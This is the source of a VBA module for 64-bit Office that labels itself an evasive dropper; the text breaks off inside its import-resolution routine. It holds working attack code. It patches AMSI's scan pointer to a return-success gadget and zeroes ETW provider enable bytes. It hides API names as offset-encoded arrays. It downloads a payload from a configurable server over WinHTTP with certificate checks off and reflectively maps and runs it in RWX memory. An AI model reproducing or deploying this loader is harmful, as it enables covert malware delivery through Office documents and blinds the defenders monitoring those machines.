Attribute VB_Name = "RunCtx"
Option Explicit

' Evasive dropper: the full chain in one module (64-bit Office).
' Requires: WinAPI_Core.bas imported into the same VBA project.
' Paste into a standard module and set the config constants below.
'
' Stage 1 - runtime content-scan neutralization. Relocates the engine's stored
' scan pointer to an existing return-success gadget (see AmsiNeutralize).
' Stage 2 - user-mode telemetry silencing. Clears the cached enable bytes on
' every ETW provider registration in the process (see EtwSilence).
' Stage 3 - payload retrieval over WinHTTP and in-process manual mapping with
' relocation, import resolution, and a threadless DllMain call (see
' ReflectiveLoader_WinHTTP).
'
' Stages 1 and 2 are hardening: the chain runs on if either fails, and the
' report records what happened. Stage 3 failures abort. Everything logs to
' Debug.Print only; there is no UI. Set DEV_LOG to 1 for local testing.
'
' The module carries no sensitive literals; names are rebuilt at runtime from
' offset numeric arrays.

' ===================== CONFIG =====================

Private Const SERVER_HOST As String = "127.0.0.1"
Private Const SERVER_PORT As Long = 8080
Private Const PAYLOAD_PATH As String = "/payload.bin"
Private Const USE_HTTPS As Boolean = False
Private Const USER_AGENT As String = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

' ===================== DEV SWITCHES =====================

#Const DEV_LOG = 0              ' 1 = write a result file (local testing only)

#If DEV_LOG Then
Private Const DEV_LOG_PATH As String = "C:\Users\itag7\ll_projects\EvasiveVBA\test\dropper_run.log"
#End If

' ===================== CONSTANTS =====================

' PE / section walking
Private Const SCN_MEM_EXECUTE As Long = &H20000000
Private Const SCN_MEM_WRITE As Long = &H80000000
Private Const MAX_SCAN_BYTES As Long = 4194304

' stage 1: scan pointer relocation
Private Const MAX_SLOTS As Long = 16

' stage 2: telemetry gate offsets (ntdll 26100.9444)
Private Const OFF_SESS As Long = &H74       ' RegEntry: session-path enable byte
Private Const OFF_PRIV As Long = &HEC       ' RegEntry: private-buffer enable byte
Private Const OFF_TOKEN As Long = &H54      ' RegEntry: handle token (word)
Private Const PROBE_WINDOW As Long = &H120  ' EtwEventWrite prologue bytes scanned
Private Const MAX_SAVED As Long = 512
Private Const MAX_SANE_COUNT As Long = 1024

' stage 3: PE mapping
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40
Private Const IMAGE_DOS_SIGNATURE As Integer = &H5A4D
Private Const IMAGE_NT_SIGNATURE As Long = &H4550

#If Win64 Then
    Private Const PTR_SIZE As Long = 8
    Private Const OPT_IMAGE_BASE As Long = 24
    Private Const OPT_DATA_DIR As Long = 112
    Private Const PE_MAGIC As Integer = &H20B
#Else
    Private Const PTR_SIZE As Long = 4
    Private Const OPT_IMAGE_BASE As Long = 28
    Private Const OPT_DATA_DIR As Long = 96
    Private Const PE_MAGIC As Integer = &H10B
#End If

Private Const OPT_ENTRY_POINT As Long = 16
Private Const OPT_SIZE_OF_IMAGE As Long = 56
Private Const OPT_SIZE_OF_HEADERS As Long = 60
Private Const SECTION_HEADER_SIZE As Long = 40
Private Const IMPORT_DESC_SIZE As Long = 20

Private Const DLL_PROCESS_ATTACH As Long = 1
Private Const IMAGE_REL_BASED_DIR64 As Long = 10
Private Const IMAGE_REL_BASED_HIGHLOW As Long = 3

' WinHTTP
Private Const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY As Long = 0
Private Const WINHTTP_FLAG_SECURE As Long = &H800000
Private Const WINHTTP_OPTION_SECURITY_FLAGS As Long = 31
Private Const SECURITY_FLAG_IGNORE_ALL As Long = &H3300
Private Const WINHTTP_QUERY_STATUS_CODE As Long = 19
Private Const WINHTTP_QUERY_FLAG_NUMBER As Long = &H20000000

' ===================== DECLARES =====================

' --- kernel32 ---
' GetModuleHandleW, LoadLibraryW, GetProcAddress, CopyMemory, VirtualAlloc
' come from WinAPI_Core.bas.
Private Declare PtrSafe Function LoadLibraryAPtr Lib "kernel32" Alias "LoadLibraryA" ( _
    ByVal lpLibFileName As LongPtr) As LongPtr
Private Declare PtrSafe Function GetProcAddressPtr Lib "kernel32" Alias "GetProcAddress" ( _
    ByVal hModule As LongPtr, ByVal lpProcName As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualQuery Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal lpBuffer As LongPtr, _
    ByVal dwLength As LongPtr) As LongPtr

' --- ntdll ---
Private Declare PtrSafe Function EtwEventRegister Lib "ntdll" ( _
    ByVal ProviderId As LongPtr, ByVal EnableCallback As LongPtr, _
    ByVal CallbackContext As LongPtr, ByRef RegHandle As LongPtr) As Long
Private Declare PtrSafe Function EtwEventUnregister Lib "ntdll" ( _
    ByVal RegHandle As LongPtr) As Long
Private Declare PtrSafe Function NtFlushInstructionCache Lib "ntdll" ( _
    ByVal ProcessHandle As LongPtr, ByVal BaseAddress As LongPtr, _
    ByVal Length As LongPtr) As Long

' --- user32 ---
Private Declare PtrSafe Function CallWindowProcW Lib "user32" ( _
    ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
    ByVal Msg As LongPtr, ByVal wParam As LongPtr, _
    ByVal lParam As LongPtr) As LongPtr

' --- winhttp ---
Private Declare PtrSafe Function WinHttpOpen Lib "winhttp" ( _
    ByVal pszAgentW As LongPtr, ByVal dwAccessType As Long, _
    ByVal pszProxyW As LongPtr, ByVal pszProxyBypassW As LongPtr, _
    ByVal dwFlags As Long) As LongPtr
Private Declare PtrSafe Function WinHttpConnect Lib "winhttp" ( _
    ByVal hSession As LongPtr, ByVal pswzServerName As LongPtr, _
    ByVal nServerPort As Long, ByVal dwReserved As Long) As LongPtr
Private Declare PtrSafe Function WinHttpOpenRequest Lib "winhttp" ( _
    ByVal hConnect As LongPtr, ByVal pwszVerb As LongPtr, _
    ByVal pwszObjectName As LongPtr, ByVal pwszVersion As LongPtr, _
    ByVal pwszReferrer As LongPtr, ByVal ppwszAcceptTypes As LongPtr, _
    ByVal dwFlags As Long) As LongPtr
Private Declare PtrSafe Function WinHttpSetOption Lib "winhttp" ( _
    ByVal hInternet As LongPtr, ByVal dwOption As Long, _
    ByVal lpBuffer As LongPtr, ByVal dwBufferLength As Long) As Long
Private Declare PtrSafe Function WinHttpSendRequest Lib "winhttp" ( _
    ByVal hRequest As LongPtr, ByVal lpszHeaders As LongPtr, _
    ByVal dwHeadersLength As Long, ByVal lpOptional As LongPtr, _
    ByVal dwOptionalLength As Long, ByVal dwTotalLength As Long, _
    ByVal dwContext As LongPtr) As Long
Private Declare PtrSafe Function WinHttpReceiveResponse Lib "winhttp" ( _
    ByVal hRequest As LongPtr, ByVal lpReserved As LongPtr) As Long
Private Declare PtrSafe Function WinHttpQueryHeaders Lib "winhttp" ( _
    ByVal hRequest As LongPtr, ByVal dwInfoLevel As Long, _
    ByVal pwszName As LongPtr, ByVal lpBuffer As LongPtr, _
    ByRef lpdwBufferLength As Long, ByRef lpdwIndex As Long) As Long
Private Declare PtrSafe Function WinHttpReadData Lib "winhttp" ( _
    ByVal hRequest As LongPtr, ByVal lpBuffer As LongPtr, _
    ByVal dwNumberOfBytesToRead As Long, ByRef lpdwNumberOfBytesRead As Long) As Long
Private Declare PtrSafe Function WinHttpCloseHandle Lib "winhttp" ( _
    ByVal hInternet As LongPtr) As Long

' ===================== STATE =====================

' stage 1
Private m1Slots(0 To MAX_SLOTS - 1) As LongPtr
Private m1Orig(0 To MAX_SLOTS - 1) As LongPtr
Private m1SlotCount As Long
Private m1State As String

' stage 2
Private m2Entry(0 To MAX_SAVED - 1) As LongPtr
Private m2OldSess(0 To MAX_SAVED - 1) As Byte
Private m2OldPriv(0 To MAX_SAVED - 1) As Byte
Private m2Count As Long
Private m2State As String

' stage 3
Private mDllBase As LongPtr
Private mReport As String

' ===================== POINTER HELPERS =====================

Private Function RdPtr(ByVal p As LongPtr) As LongPtr
    Dim v As LongPtr
    If p <> 0 Then CopyMemory VarPtr(v), p, 8
    RdPtr = v
End Function

Private Function RdDw(ByVal p As LongPtr) As Long
    Dim v As Long
    If p <> 0 Then CopyMemory VarPtr(v), p, 4
    RdDw = v
End Function

Private Function RdWd(ByVal p As LongPtr) As Integer
    Dim v As Integer
    If p <> 0 Then CopyMemory VarPtr(v), p, 2
    RdWd = v
End Function

Private Function RdByte(ByVal p As LongPtr) As Byte
    Dim v As Byte
    If p <> 0 Then CopyMemory VarPtr(v), p, 1
    RdByte = v
End Function

Private Function RdLong(ByVal p As LongPtr) As Long
    RdLong = RdDw(p)
End Function

Private Sub WrPtr(ByVal p As LongPtr, ByVal v As LongPtr)
    If p <> 0 Then CopyMemory p, VarPtr(v), CLngPtr(PTR_SIZE)
End Sub

Private Sub WrByte(ByVal p As LongPtr, ByVal v As Byte)
    If p <> 0 Then CopyMemory p, VarPtr(v), 1
End Sub

Private Function SafePtr(ByVal p As LongPtr, ByVal n As Long) As Boolean
    Dim mbi(0 To 59) As Byte
    If p = 0 Then Exit Function
    If VirtualQuery(p, VarPtr(mbi(0)), 48) = 0 Then Exit Function
    Dim st As Long, pr As Long
    st = RdDw(VarPtr(mbi(0)) + &H20)
    pr = RdDw(VarPtr(mbi(0)) + &H24)
    If st <> &H1000 Then Exit Function
    If pr = &H1 Or pr = &H100 Then Exit Function
    SafePtr = True
End Function

' ===================== STRING DECODER =====================

Private Function Ds(ByVal e As Variant, ByVal o As Long) As String
    Dim i As Long, s As String
    For i = LBound(e) To UBound(e)
        s = s & ChrW$(e(i) - o)
    Next i
    Ds = s
End Function

Private Function ModBase(ByVal encName As Variant) As LongPtr
    Dim nm As String, h As LongPtr
    nm = Ds(encName, 3)
    h = GetModuleHandleW(StrPtr(nm))
    If h = 0 Then h = LoadLibraryW(StrPtr(nm))
    ModBase = h
End Function

' ===================== PE WALKER =====================

Private Function PeSections(ByVal base As LongPtr, _
        ByRef sBase() As LongPtr, ByRef sSize() As Long, ByRef sFlags() As Long) As Long

    Dim n As Long, optSize As Integer, secOff As LongPtr
    Dim e_lfanew As Long, i As Long, cnt As Long
    Dim vsz As Long, va As Long, flg As Long

    If base = 0 Then Exit Function
    If RdDw(base) <> &H905A4D Then Exit Function
    e_lfanew = RdDw(base + &H3C)
    If RdDw(base + e_lfanew) <> &H4550 Then Exit Function

    n = RdWd(base + e_lfanew + 6)
    optSize = RdWd(base + e_lfanew + 20)
    secOff = base + e_lfanew + 24 + optSize

    cnt = 0
    For i = 0 To n - 1
        If cnt > 31 Then Exit For
        vsz = RdDw(secOff + i * 40 + 8)
        va = RdDw(secOff + i * 40 + 12)
        flg = RdDw(secOff + i * 40 + 36)
        If va <> 0 And vsz > 0 Then
            sBase(cnt) = base + va
            sSize(cnt) = vsz
            sFlags(cnt) = flg
            cnt = cnt + 1
        End If
    Next i
    PeSections = cnt
End Function

Private Function ImageEnd(ByVal base As LongPtr) As LongPtr
    Dim sBase(0 To 31) As LongPtr, sSize(0 To 31) As Long, sFlags(0 To 31) As Long
    Dim n As Long, i As Long, hi As LongPtr
    n = PeSections(base, sBase, sSize, sFlags)
    For i = 0 To n - 1
        If sBase(i) + sSize(i) > hi Then hi = sBase(i) + sSize(i)
    Next i
    ImageEnd = hi
End Function

' ===================== SCANNERS =====================

Private Function FindQw(ByVal pBase As LongPtr, ByVal pEnd As LongPtr, ByVal val As LongPtr) As LongPtr
    Dim off As Long, span As Long, v As LongPtr
    span = CLng(pEnd - pBase)
    If span > MAX_SCAN_BYTES Then span = MAX_SCAN_BYTES
    For off = 0 To span - 8 Step 8
        CopyMemory VarPtr(v), pBase + off, 8
        If v = val Then
            FindQw = pBase + off
            Exit Function
        End If
    Next off
End Function

Private Function FindGadget(ByVal hMod As LongPtr) As LongPtr
    Dim sBase(0 To 31) As LongPtr, sSize(0 To 31) As Long, sFlags(0 To 31) As Long
    Dim n As Long, i As Long, j As Long, take As Long
    Dim buf() As Byte

    n = PeSections(hMod, sBase, sSize, sFlags)
    For i = 0 To n - 1
        If (sFlags(i) And SCN_MEM_EXECUTE) <> 0 Then
            take = sSize(i)
            If take > MAX_SCAN_BYTES Then take = MAX_SCAN_BYTES
            ReDim buf(0 To take - 1)
            CopyMemory VarPtr(buf(0)), sBase(i), take
            For j = 0 To take - 3
                If buf(j) = &H33 Then
                    If buf(j + 1) = &HC0 Then
                        If buf(j + 2) = &HC3 Then
                            FindGadget = sBase(i) + j
                            Exit Function
                        End If
                    End If
                End If
            Next j
        End If
    Next i
End Function

Private Function Unsigned(ByVal v As Long) As LongPtr
    Unsigned = v
    If v < 0 Then Unsigned = Unsigned + 4294967296#
End Function

' =========================================================
' STAGE 1: runtime content-scan neutralization
' =========================================================

Private Function ArmScan() As Boolean
    #If Win64 Then
        Dim hEngine As LongPtr, hNt As LongPtr, hAmsi As LongPtr
        Dim pScan As LongPtr, slot As LongPtr
        Dim sBase(0 To 31) As LongPtr, sSize(0 To 31) As Long, sFlags(0 To 31) As Long
        Dim n As Long, i As Long

        If m1SlotCount > 0 Then
            ArmScan = True
            Exit Function
        End If
        m1State = "failed"

        hAmsi = ModBase(Array(100, 112, 118, 108, 49, 103, 111, 111))
        If hAmsi = 0 Then
            m1State = "inactive (scan library not loaded)"
            ArmScan = True
            Exit Function
        End If
        pScan = GetProcAddress(hAmsi, Ds(Array(68, 112, 118, 108, 86, 102, 100, 113, 86, 119, 117, 108, 113, 106), 3))
        If pScan = 0 Then Exit Function

        hEngine = ModBase(Array(89, 69, 72, 58, 49, 71, 79, 79))
        If hEngine = 0 Then Exit Function

        n = PeSections(hEngine, sBase, sSize, sFlags)
        For i = 0 To n - 1
            If (sFlags(i) And SCN_MEM_WRITE) <> 0 Then
                slot = sBase(i)
                Do While slot <> 0 And m1SlotCount < MAX_SLOTS
                    slot = FindQw(slot, sBase(i) + sSize(i), pScan)
                    If slot <> 0 Then
                        m1Slots(m1SlotCount) = slot
                        m1Orig(m1SlotCount) = pScan
                        m1SlotCount = m1SlotCount + 1
                        slot = slot + 8
                    End If
                Loop
            End If
        Next i

        If m1SlotCount = 0 Then
            m1State = "inactive (engine has no bound scan pointer)"
            ArmScan = True
            Exit Function
        End If

        hNt = ModBase(Array(113, 119, 103, 111, 111, 49, 103, 111, 111))
        Dim gad As LongPtr
        gad = FindGadget(hNt)
        If gad = 0 Then
            m1SlotCount = 0
            Exit Function
        End If

        For i = 0 To m1SlotCount - 1
            CopyMemory m1Slots(i), VarPtr(gad), 8
            If RdPtr(m1Slots(i)) <> gad Then
                m1SlotCount = 0
                Exit Function
            End If
        Next i

        m1State = "redirected"
        ArmScan = True
    #End If
End Function

Private Sub DisarmScan()
    #If Win64 Then
        Dim i As Long
        For i = 0 To m1SlotCount - 1
            CopyMemory m1Slots(i), VarPtr(m1Orig(i)), 8
        Next i
        m1SlotCount = 0
        m1State = "idle"
    #End If
End Sub

' =========================================================
' STAGE 2: user-mode telemetry silencing
' =========================================================

Private Function ArmTelemetry() As Boolean
    #If Win64 Then
        Dim pTable As LongPtr, pCounts As LongPtr
        Dim b As Long, i As Long, cnt As Long
        Dim arr As LongPtr, e As LongPtr

        If m2Count > 0 Then
            ArmTelemetry = True
            Exit Function
        End If
        m2State = "failed"

        If Not Discover(pTable, pCounts) Then Exit Function

        For b = 0 To 7
            arr = RdPtr(pTable + b * 8)
            If arr <> 0 And arr > &H10000 Then
                cnt = RdDw(pCounts + b * 4)
                If cnt < 0 Or cnt > MAX_SANE_COUNT Then cnt = 0
                If Not SafePtr(arr, cnt * 8 + 8) Then cnt = 0
                For i = 0 To cnt - 1
                    e = RdPtr(arr + i * 8)
                    If e > &H10000 And e < 140733193013248# And (e And 1) = 0 Then
                        If SafePtr(e, &H100) Then
                            If m2Count < MAX_SAVED Then
                                m2Entry(m2Count) = e
                                m2OldSess(m2Count) = RdByte(e + OFF_SESS)
                                m2OldPriv(m2Count) = RdByte(e + OFF_PRIV)
                                WrByte e + OFF_SESS, 0
                                WrByte e + OFF_PRIV, 0
                                m2Count = m2Count + 1
                            End If
                        End If
                    End If
                Next i
            End If
        Next b

        If m2Count = 0 Then
            m2State = "inactive (no live registrations)"
            ArmTelemetry = True
            Exit Function
        End If

        For i = 0 To m2Count - 1
            If RdByte(m2Entry(i) + OFF_SESS) <> 0 Or RdByte(m2Entry(i) + OFF_PRIV) <> 0 Then
                DisarmTelemetry
                Exit Function
            End If
        Next i

        m2State = "silenced"
        ArmTelemetry = True
    #End If
End Function

Private Sub DisarmTelemetry()
    #If Win64 Then
        Dim i As Long
        For i = 0 To m2Count - 1
            WrByte m2Entry(i) + OFF_SESS, m2OldSess(i)
            WrByte m2Entry(i) + OFF_PRIV, m2OldPriv(i)
        Next i
        m2Count = 0
        m2State = "idle"
    #End If
End Sub

Private Function Discover(ByRef pTable As LongPtr, ByRef pCounts As LongPtr) As Boolean
    Dim hNt As LongPtr, imgEnd As LongPtr, funcWrite As LongPtr
    Dim g(0 To 15) As Byte
    Dim hReg As LongPtr, st As Long
    Dim bucket As Long, probeIdx As Long, token As Integer
    Dim code() As Byte, i As Long, d As Long

    hNt = ModBase(Array(113, 119, 103, 111, 111, 49, 103, 111, 111))
    If hNt = 0 Then Exit Function
    imgEnd = ImageEnd(hNt)
    If imgEnd <= hNt Then Exit Function

    funcWrite = GetProcAddress(hNt, Ds(Array(72, 119, 122, 72, 121, 104, 113, 119, 90, 117, 108, 119, 104), 3))
    If funcWrite = 0 Then Exit Function

    g(0) = &H6E: g(1) = &H1F: g(2) = &H2A: g(3) = &H90
    g(4) = &H7C: g(5) = &H4B: g(6) = &H4D: g(7) = &H35
    g(8) = &H9A: g(9) = &H18: g(10) = &HB5: g(11) = &H2D
    g(12) = &HF: g(13) = &H3E: g(14) = &H11: g(15) = &HC7
    st = EtwEventRegister(VarPtr(g(0)), 0, 0, hReg)
    If st <> 0 Or hReg = 0 Then Exit Function
    If (hReg And 1) = 0 Then EtwEventUnregister hReg: Exit Function

    Dim lowDw As Long
    CopyMemory VarPtr(lowDw), VarPtr(hReg), 4
    bucket = (lowDw \ 2) And 7
    probeIdx = (lowDw And &HFFFFFFF0&) \ 16
    token = RdWd(VarPtr(hReg) + 4) And &HFFFF&

    ReDim code(0 To PROBE_WINDOW - 1)
    CopyMemory VarPtr(code(0)), funcWrite, PROBE_WINDOW

    For i = 0 To PROBE_WINDOW - 7
        Dim isTbl As Boolean, isCnt As Boolean, dOff As Long, pfx As Long
        isTbl = False: isCnt = False: dOff = 0: pfx = 0

        If i + 4 < PROBE_WINDOW Then
            If code(i) = &H4C And code(i + 1) = &H8B And code(i + 2) = &H9C And code(i + 3) = &HD3 Then
                isTbl = True: dOff = i + 4: pfx = 8
            ElseIf code(i) = &H3B And code(i + 1) = &H84 And code(i + 2) = &H93 Then
                isCnt = True: dOff = i + 3: pfx = 7
            ElseIf code(i) = &H4C And code(i + 1) = &H8B And code(i + 2) = &H1D Then
                isTbl = True: dOff = i + 3: pfx = 7
            ElseIf (code(i) = &H48 Or code(i) = &H4C) And code(i + 1) = &H8B And code(i + 2) = &H5 Then
                isTbl = True: dOff = i + 3: pfx = 7
            ElseIf code(i) = &H3B And code(i + 1) = &H5 Then
                isCnt = True: dOff = i + 2: pfx = 6
            ElseIf code(i) = &H8B And code(i + 1) = &H5 Then
                isCnt = True: dOff = i + 2: pfx = 6
            End If
        End If

        If dOff = 0 Or dOff + 4 > PROBE_WINDOW Then GoTo NextI
        d = RdDw(VarPtr(code(dOff)))

        Dim tgt1 As LongPtr, tgt2 As LongPtr
        tgt1 = hNt + Unsigned(d)
        tgt2 = 0
        If pfx = 7 Or pfx = 6 Then tgt2 = funcWrite + dOff + 4 + d

        If isTbl Then
            If ValidateTable(tgt1, bucket, probeIdx, token, hNt, imgEnd) Then pTable = tgt1
            If pTable = 0 And tgt2 <> 0 Then
                If ValidateTable(tgt2, bucket, probeIdx, token, hNt, imgEnd) Then pTable = tgt2
            End If
        ElseIf isCnt Then
            If ValidateCounts(tgt1, bucket, probeIdx, hNt, imgEnd) Then pCounts = tgt1
            If pCounts = 0 And tgt2 <> 0 Then
                If ValidateCounts(tgt2, bucket, probeIdx, hNt, imgEnd) Then pCounts = tgt2
            End If
        End If

        If pTable <> 0 And pCounts <> 0 Then Exit For
NextI:
    Next i

    EtwEventUnregister hReg
    Discover = (pTable <> 0 And pCounts <> 0)
End Function

Private Function ValidateTable(ByVal t As LongPtr, ByVal bucket As Long, _
        ByVal probeIdx As Long, ByVal token As Integer, _
        ByVal hNt As LongPtr, ByVal imgEnd As LongPtr) As Boolean
    Dim arr As LongPtr, e As LongPtr, j As Long, v As LongPtr
    If t <= hNt Or t + 64 > imgEnd Then Exit Function
    If Not SafePtr(t, 64) Then Exit Function

    For j = 0 To 7
        v = RdPtr(t + j * 8)
        If v <> 0 Then
            If v < &H10000 Or v >= 140733193013248# Then Exit Function
            If (v And &HF) <> 0 Then Exit Function
        End If
    Next j

    arr = RdPtr(t + bucket * 8)
    If arr = 0 Then Exit Function
    If Not SafePtr(arr + probeIdx * 8, 8) Then Exit Function
    e = RdPtr(arr + probeIdx * 8)
    If e = 0 Or e < &H10000 Or e >= 140733193013248# Then Exit Function
    If (e And 1) <> 0 Then Exit Function
    If Not SafePtr(e + OFF_TOKEN, 2) Then Exit Function
    ValidateTable = (RdWd(e + OFF_TOKEN) = token)
End Function

Private Function ValidateCounts(ByVal c As LongPtr, ByVal bucket As Long, _
        ByVal probeIdx As Long, ByVal hNt As LongPtr, ByVal imgEnd As LongPtr) As Boolean
    Dim n As Long
    If c <= hNt Or c + 32 > imgEnd Then Exit Function
    If Not SafePtr(c, 32) Then Exit Function
    n = RdDw(c + bucket * 4)
    ValidateCounts = (n > probeIdx And n < MAX_SANE_COUNT)
End Function

' =========================================================
' STAGE 3: payload retrieval and manual mapping
' =========================================================

Private Function DownloadPayload() As Byte()
    Dim ua As String: ua = USER_AGENT
    Dim hSession As LongPtr
    hSession = WinHttpOpen(StrPtr(ua), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0)
    If hSession = 0 Then Exit Function

    Dim host As String: host = SERVER_HOST
    Dim hConnect As LongPtr
    hConnect = WinHttpConnect(hSession, StrPtr(host), CLng(SERVER_PORT), 0)
    If hConnect = 0 Then
        WinHttpCloseHandle hSession
        Exit Function
    End If

    Dim verb As String: verb = "GET"
    Dim path As String: path = PAYLOAD_PATH
    Dim dwFlags As Long
    If USE_HTTPS Then dwFlags = WINHTTP_FLAG_SECURE

    Dim hRequest As LongPtr
    hRequest = WinHttpOpenRequest(hConnect, StrPtr(verb), StrPtr(path), 0, 0, 0, dwFlags)
    If hRequest = 0 Then
        WinHttpCloseHandle hConnect
        WinHttpCloseHandle hSession
        Exit Function
    End If

    If USE_HTTPS Then
        Dim secFlags As Long: secFlags = SECURITY_FLAG_IGNORE_ALL
        WinHttpSetOption hRequest, WINHTTP_OPTION_SECURITY_FLAGS, VarPtr(secFlags), 4
    End If

    If WinHttpSendRequest(hRequest, 0, 0, 0, 0, 0, 0) = 0 Then
        WinHttpCloseHandle hRequest: WinHttpCloseHandle hConnect: WinHttpCloseHandle hSession
        Exit Function
    End If

    If WinHttpReceiveResponse(hRequest, 0) = 0 Then
        WinHttpCloseHandle hRequest: WinHttpCloseHandle hConnect: WinHttpCloseHandle hSession
        Exit Function
    End If

    Dim statusCode As Long, bufLen As Long, idx As Long
    bufLen = 4: idx = 0
    WinHttpQueryHeaders hRequest, WINHTTP_QUERY_STATUS_CODE Or WINHTTP_QUERY_FLAG_NUMBER, _
        0, VarPtr(statusCode), bufLen, idx
    If statusCode <> 200 Then
        WinHttpCloseHandle hRequest: WinHttpCloseHandle hConnect: WinHttpCloseHandle hSession
        Exit Function
    End If

    Dim result() As Byte
    Dim totalLen As Long
    Dim buf(0 To 4095) As Byte
    Dim bytesRead As Long
    ReDim result(0 To 65535)

    Do
        bytesRead = 0
        If WinHttpReadData(hRequest, VarPtr(buf(0)), 4096, bytesRead) = 0 Then Exit Do
        If bytesRead = 0 Then Exit Do

        If totalLen + bytesRead > UBound(result) + 1 Then
            ReDim Preserve result(0 To (totalLen + bytesRead) * 2)
        End If
        CopyMemory VarPtr(result(totalLen)), VarPtr(buf(0)), CLngPtr(bytesRead)
        totalLen = totalLen + bytesRead
    Loop

    WinHttpCloseHandle hRequest
    WinHttpCloseHandle hConnect
    WinHttpCloseHandle hSession

    If totalLen > 0 Then
        ReDim Preserve result(0 To totalLen - 1)
        DownloadPayload = result
    End If
End Function

Private Function MapAndExecute(ByRef pe() As Byte) As LongPtr
    Dim raw As LongPtr
    raw = VarPtr(pe(0))

    If RdWd(raw) <> IMAGE_DOS_SIGNATURE Then Exit Function

    Dim e_lfanew As Long
    e_lfanew = RdLong(raw + 60)

    Dim ntHdr As LongPtr
    ntHdr = raw + CLngPtr(e_lfanew)

    If RdLong(ntHdr) <> IMAGE_NT_SIGNATURE Then Exit Function

    Dim fileHdr As LongPtr: fileHdr = ntHdr + 4
    Dim numSections As Integer: numSections = RdWd(fileHdr + 2)
    Dim optHdrSize As Integer: optHdrSize = RdWd(fileHdr + 16)
    Dim optHdr As LongPtr: optHdr = fileHdr + 20

    If RdWd(optHdr) <> PE_MAGIC Then Exit Function

    Dim entryPointRVA As Long: entryPointRVA = RdLong(optHdr + OPT_ENTRY_POINT)
    Dim imageBase As LongPtr: imageBase = RdPtr(optHdr + OPT_IMAGE_BASE)
    Dim sizeOfImage As Long: sizeOfImage = RdLong(optHdr + OPT_SIZE_OF_IMAGE)
    Dim sizeOfHeaders As Long: sizeOfHeaders = RdLong(optHdr + OPT_SIZE_OF_HEADERS)

    Dim importDirRVA As Long: importDirRVA = RdLong(optHdr + OPT_DATA_DIR + 8)
    Dim relocDirRVA As Long: relocDirRVA = RdLong(optHdr + OPT_DATA_DIR + 40)
    Dim relocDirSize As Long: relocDirSize = RdLong(optHdr + OPT_DATA_DIR + 44)

    Dim allocBase As LongPtr
    allocBase = VirtualAlloc(imageBase, CLngPtr(sizeOfImage), _
                             MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If allocBase = 0 Then
        allocBase = VirtualAlloc(0, CLngPtr(sizeOfImage), _
                                 MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    End If
    If allocBase = 0 Then Exit Function

    CopyMemory allocBase, raw, CLngPtr(sizeOfHeaders)

    Dim secHdr As LongPtr
    secHdr = optHdr + CLngPtr(optHdrSize)

    Dim i As Long
    For i = 0 To numSections - 1
        Dim sh As LongPtr: sh = secHdr + CLngPtr(i * SECTION_HEADER_SIZE)
        Dim secVA As Long: secVA = RdLong(sh + 12)
        Dim secRawSz As Long: secRawSz = RdLong(sh + 16)
        Dim secRawPtr As Long: secRawPtr = RdLong(sh + 20)

        If secRawSz > 0 And secRawPtr > 0 Then
            CopyMemory allocBase + CLngPtr(secVA), raw + CLngPtr(secRawPtr), CLngPtr(secRawSz)
        End If
    Next

    Dim delta As LongPtr
    delta = allocBase - imageBase

    If delta <> 0 And relocDirRVA <> 0 And relocDirSize <> 0 Then
        ProcessRelocations allocBase, CLngPtr(relocDirRVA), CLngPtr(relocDirSize), delta
    End If

    If importDirRVA <> 0 Then
        ProcessImports allocBase, CLngPtr(importDirRVA)
    End If

    NtFlushInstructionCache -1, allocBase, CLngPtr(sizeOfImage)

    Dim ep As LongPtr
    ep = allocBase + CLngPtr(entryPointRVA)

    CallWindowProcW ep, allocBase, DLL_PROCESS_ATTACH, 0, 0

    MapAndExecute = allocBase
End Function

Private Sub ProcessRelocations(ByVal base As LongPtr, ByVal relocRVA As LongPtr, _
                                ByVal relocSize As LongPtr, ByVal delta As LongPtr)
    Dim block As LongPtr: block = base + relocRVA
    Dim blockEnd As LongPtr: blockEnd = block + relocSize

    Do While block < blockEnd
        Dim blockVA As Long: blockVA = RdLong(block)
        Dim blockSz As Long: blockSz = RdLong(block + 4)
        If blockSz = 0 Then Exit Do

        Dim numEntries As Long
        numEntries = (blockSz - 8) \ 2

        Dim j As Long
        For j = 0 To numEntries - 1
            Dim lo As Byte, hi As Byte
            CopyMemory VarPtr(lo), block + 8 + CLngPtr(j * 2), 1
            CopyMemory VarPtr(hi), block + 8 + CLngPtr(j * 2) + 1, 1

            Dim rType As Long: rType = (CLng(hi) \ 16) And &HF
            Dim rOffset As Long: rOffset = CLng(lo) Or ((CLng(hi) And &HF) * 256)

            Dim target As LongPtr
            target = base + CLngPtr(blockVA) + CLngPtr(rOffset)

            Select Case rType
                Case IMAGE_REL_BASED_DIR64
                    Dim val64 As LongPtr: val64 = RdPtr(target)
                    WrPtr target, val64 + delta

                Case IMAGE_REL_BASED_HIGHLOW
                    ' add in LongPtr and store the low dword: the original
                    ' CLng(delta And &HFFFFFFFF) overflows when bit 31 is set
                    Dim nv As LongPtr
                    nv = CLngPtr(RdLong(target)) + delta
                    CopyMemory target, VarPtr(nv), 4

                Case 0
            End Select
        Next

        block = block + CLngPtr(blockSz)
    Loop
End Sub

Private Sub ProcessImports(ByVal base As LongPtr, ByVal importRVA As LongPtr)
    Dim desc As LongPtr: desc = base + importRVA

    Do
        Dim nameRVA As Long: nameRVA = RdLong(desc + 12)
        If nameRVA = 0 Then Exit Do

        Dim hMod As LongPtr
        hMod = LoadLibraryAPtr(base + CLngPtr(nameRVA))
        If hMod = 0 Then GoTo NextDesc

        Dim origThunkRVA As Long: origThunkRVA = RdLong(desc)
        Dim thunkRVA As Long: thunkRVA = RdLong(desc + 16)

        Dim intPtr As LongPtr
        If origThunkRVA <> 0 Then
            intPtr = base + CLngPtr(origThunkRVA)
        Else
            intPtr = base + CLngPtr(thunkRVA)
        End If

        Dim iatPtr As LongPtr: iatPtr = base + CLngPtr(thunkRVA)

        Do
            Dim thunkVal As LongPtr: thunkVal = RdPtr(intPtr)
            If thunkVal = 0 Then Exit Do

            Dim funcAddr As LongPtr
